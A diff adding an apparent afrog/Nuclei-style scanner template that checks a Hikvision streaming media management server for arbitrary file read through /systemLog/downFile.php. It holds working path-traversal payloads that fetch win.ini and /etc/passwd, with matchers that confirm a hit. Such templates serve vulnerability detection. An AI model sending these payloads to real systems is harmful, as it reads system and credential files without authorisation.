@@ -1,0 +1,27 @@
+id: hikvision-downfle-fileread
+
+info:
+  name: 海康威视流媒体管理服务器 systemLog/downFile.php 任意文件读取
+  author: zan8in
+  severity: high
+  description: |
+    海康威视流媒体管理服务器 /systemLog/downFile.php 存在目录遍历，可读取系统文件。
+    与综合安防平台、摄像头、iVMS 不是同一 SKU。
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+    - https://github.com/zan8in/afrog
+  tags: hikvision,stream,fileread
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/win.ini"
+      - "{{BaseURL}}/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../etc/passwd"
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "bit app support")'
+          - 'status_code == 200 && regex("root:.*?:[0-9]*:[0-9]*:", body)'
+        condition: or
